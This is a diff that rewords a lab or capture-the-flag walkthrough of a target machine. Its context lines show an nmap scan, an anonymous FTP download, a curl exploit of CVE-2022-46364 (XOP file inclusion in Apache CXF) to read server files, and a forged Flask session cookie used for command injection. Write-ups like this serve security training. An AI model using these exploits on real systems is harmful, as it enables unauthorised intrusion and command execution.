@@ -53,20 +53,20 @@ $ nmap -Pn -sV -p 21,22,80,8080,8500,8888 10.129.12.147
 8888/tcp open  http     Hoverfly admin   (auth)
 :::
 
-Anonymous FTP → grab `employee-service.jar` from `/pub`:
+Anonymous FTP is enabled. Download `employee-service.jar` from `/pub`:
 
 ::: terminal title="shell · operator@kali" lang="bash"
 $ curl --user anonymous:anonymous -o employee-service.jar \
     ftp://10.129.12.147/pub/employee-service.jar
 :::
 
-Decompile. `ServerStarter.java` binds a SOAP service at `http://0.0.0.0:8080/employeeservice`, and `submitReport` takes a `Report` with a `content` field.
+Decompile the JAR. `ServerStarter.java` binds a SOAP service at `http://0.0.0.0:8080/employeeservice`, and `submitReport` takes a `Report` with a `content` field.
 
 :::
 
 ::: stage n=2 label="LFI" title="CVE-2022-46364 — XOP MTOM reference escapes the SOAP body."
 
-Apache CXF + Jetty 9.4.27 is vulnerable to MTOM XOP Include abuse: the `<xop:Include href="...">` tag can reference {red:arbitrary `file://` URIs} which CXF happily dereferences server-side.
+Apache CXF + Jetty 9.4.27 is vulnerable to MTOM XOP Include abuse: the `<xop:Include href="...">` tag can reference {red:arbitrary `file://` URIs} which CXF dereferences server-side.
 
 ::: terminal title="shell · operator@kali · CVE-2022-46364" lang="bash"
 $ curl -s -X POST "http://10.129.12.147:8080/employeeservice" \
@@ -97,7 +97,7 @@ Inside `payload.xml`:
 </soapenv:Envelope>
 :::
 
-Response base64-encodes the file. `hoverfly.service` exposes the admin credentials baked into `ExecStart`:
+The response contains the file encoded in base64. `hoverfly.service` exposes the admin credentials in `ExecStart`:
 
 ```
 ExecStart=/opt/HoverFly/hoverfly -add -username admin -password [REDACTED] ...
@@ -155,7 +155,7 @@ $ ls ~/
 syswatch-v1.zip
 :::
 
-ACL deny on `/opt/syswatch/` but a copy of the source lives in `dev_ryan`'s home. Key findings:
+An ACL blocks access to `/opt/syswatch/`, but a copy of the source is in `dev_ryan`'s home:
 
 - `syswatch.sh` sources `/opt/syswatch/config/syswatch.conf` (root-owned)
 - `syswatch.sh logs <file>` accepts symlinks that pass a name regex
@@ -166,7 +166,7 @@ ACL deny on `/opt/syswatch/` but a copy of the source lives in `dev_ryan`'s home
 
 ::: stage n=5 label="SESSION" title="Flask session forge → pipe injection as syswatch."
 
-Secret is readable; forge the session cookie locally:
+The secret is readable, so forge a session cookie locally:
 
 ::: terminal title="shell · session forge" lang="python"
 from itsdangerous import URLSafeTimedSerializer
@@ -195,7 +195,7 @@ requests.post("http://127.0.0.1:7777/service-status",
               data={"service": payload})
 :::
 
-That runs as `syswatch`, which has write access to `/opt/syswatch/logs/` and `/opt/syswatch/backup/`. Good enough.
+The command runs as `syswatch`, which has write access to `/opt/syswatch/logs/` and `/opt/syswatch/backup/`.
 
 :::
 
